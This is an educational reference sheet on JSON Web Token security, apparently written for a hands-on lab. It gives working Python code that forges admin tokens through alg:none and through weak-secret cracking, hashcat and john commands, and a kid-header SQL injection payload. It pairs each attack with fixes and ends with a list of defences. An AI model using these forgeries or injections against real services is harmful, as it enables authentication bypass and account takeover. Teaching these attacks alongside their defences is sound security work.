# JWT Security — Reference Notes

## 1. What is a JWT?

A JSON Web Token (JWT) is a compact, URL-safe token format used to represent claims between two parties. It is the standard mechanism for stateless authentication in web applications.

**Structure:** `header.payload.signature` — three Base64url-encoded sections separated by dots.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   <- header
.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0  <- payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  <- signature
```

**Header** (decoded): `{"alg": "HS256", "typ": "JWT"}`  
**Payload** (decoded): `{"sub": "alice", "role": "user"}`  
**Signature**: HMAC-SHA256 of `header.payload` using the server's secret key

The server verifies the signature before trusting any claim in the payload.

---

## 2. How JWT signing works

### HS256 (symmetric)
```
signature = HMAC-SHA256(base64url(header) + "." + base64url(payload), secret_key)
```
The same key is used to sign and verify. If you know the key, you can forge any token.

### RS256 (asymmetric)
```
signature = RSA-SHA256(base64url(header) + "." + base64url(payload), private_key)
```
Verification uses the public key. Forging requires the private key.

---

## 3. Common JWT vulnerabilities

### 3.1 — alg:none (CVE-2015-9235)
**What:** The JWT spec allows `"alg": "none"` to mean "no signature". Vulnerable libraries accept unsigned tokens without checking if the algorithm was explicitly allowed.

**How to exploit:**
1. Get a valid signed token
2. Decode the header: `{"alg": "HS256", "typ": "JWT"}`
3. Change to: `{"alg": "none", "typ": "JWT"}`
4. Modify the payload: change `"role": "user"` to `"role": "admin"`
5. Re-encode both parts (Base64url, no padding)
6. Append an empty signature: `header.payload.`
7. Submit the token

**Manual exploit:**
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"sub": "alice", "role": "admin"})
token   = f"{header}.{payload}."
```

**Fix:** Explicitly reject `alg:none`. Never trust the algorithm declared in the header — enforce it server-side.

---

### 3.2 — Weak Secret
**What:** JWTs signed with HS256 can be cracked offline if the secret is weak (dictionary word, short string, etc.). The token itself is public — anyone can attempt a brute-force.

**How to exploit:**
```bash
# hashcat
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
```

Once you have the secret, forge a new token:
```python
import hmac, hashlib, base64, json

secret = "password123"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "alice", "role": "admin"}).encode())
sig = b64url(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
```

**Fix:** Use a cryptographically random secret of at least 256 bits. Store it in an environment variable, never in source code.

---

### 3.3 — kid Header Injection
**What:** The `kid` (Key ID) JWT header field tells the server which key to use for verification. If the server uses `kid` in a SQL query without parameterising it, an attacker can inject SQL to control what key the server retrieves — including injecting a known constant as the "key".

**Vulnerable code:**
```python
kid = header.get("kid")
row = db.execute(f"SELECT secret FROM keys WHERE id = '{kid}'").fetchone()
secret = row[0]
```

**How to exploit:**
1. Craft a header with an injected `kid`:
   ```json
   {"alg": "HS256", "typ": "JWT", "kid": "x' UNION SELECT 'mysecret' -- -"}
   ```
2. The SQL becomes:
   ```sql
   SELECT secret FROM keys WHERE id = 'x' UNION SELECT 'mysecret' -- -'
   ```
3. The query returns `mysecret` as the signing key
4. Sign the payload with `mysecret`
5. Submit the forged token — the server verifies it against `mysecret` and succeeds

**Manual exploit:**
```python
kid_injection = "x' UNION SELECT 'mysecret' -- -"
controlled_secret = "mysecret"

header = {"alg": "HS256", "typ": "JWT", "kid": kid_injection}
payload = {"sub": "alice", "role": "admin"}

# sign with the injected secret
h = b64url(json.dumps(header).encode())
p = b64url(json.dumps(payload).encode())
sig = b64url(hmac.new(controlled_secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
token = f"{h}.{p}.{sig}"
```

**Fix:** Always use parameterised queries: `db.execute("SELECT secret FROM keys WHERE id = ?", (kid,))`. Validate `kid` against an allowlist of known key IDs before using it in any query.

---

## 4. HS256 vs RS256 confusion attack

A separate but related attack: some libraries let the attacker switch from RS256 (asymmetric) to HS256 (symmetric). If the server verifies HS256 tokens using the *public key* as the HMAC secret (which is known to the attacker), you can sign any payload with that public key.

This isn't implemented in this lab, but is worth knowing.

---

## 5. Other JWT weaknesses

| Weakness | Description |
|----------|-------------|
| `kid` path traversal | `kid: "../../dev/null"` — sign with empty key |
| `jku` / `x5u` injection | Header fields that point to a URL for the public key — attacker hosts their own |
| `jwk` header injection | Embedding the attacker's own public key in the header |
| Missing expiry (`exp`) | Tokens that never expire remain valid forever |
| `aud` not validated | Server accepts tokens meant for a different service |
| Sensitive data in payload | Payload is base64url — not encrypted, just encoded |

---

## 6. Tools

| Tool | Purpose |
|------|---------|
| `jwt_tool` | Automated JWT attack framework |
| `hashcat -m 16500` | Brute-force HS256 JWT secrets |
| `john --format=HMAC-SHA256` | Alternative brute-force |
| jwt.io | Decode and inspect tokens in browser |
| Burp Suite JWT Editor | MITM, tamper, and re-sign JWTs in a proxy |

---

## 7. Cheat sheet

```bash
# Decode a JWT (no verification)
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Crack with hashcat
hashcat -a 0 -m 16500 <full_jwt_token> wordlist.txt

# alg:none — Python one-liner
python3 -c "
import base64, json
enc = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = enc({'alg':'none','typ':'JWT'})
p = enc({'sub':'alice','role':'admin'})
print(f'{h}.{p}.')
"

# kid UNION injection header value
kid = "x' UNION SELECT 'secret123' -- -"
# sign the token with 'secret123'
```

---

## 8. Defences

1. **Reject `alg:none` unconditionally** — never trust the header's algorithm claim
2. **Enforce a fixed algorithm server-side** — don't allow switching between HS256 and RS256
3. **Use strong, random secrets** — 256+ bits, stored in environment variables
4. **Parameterise all database queries** — including those that use JWT header fields
5. **Validate `kid`, `jku`, `x5u`** against an allowlist before use
6. **Set short expiry (`exp`)** and validate it
7. **Validate `aud` and `iss`** to prevent cross-service token replay
8. **Use a well-audited library** — do not implement JWT verification yourself in production
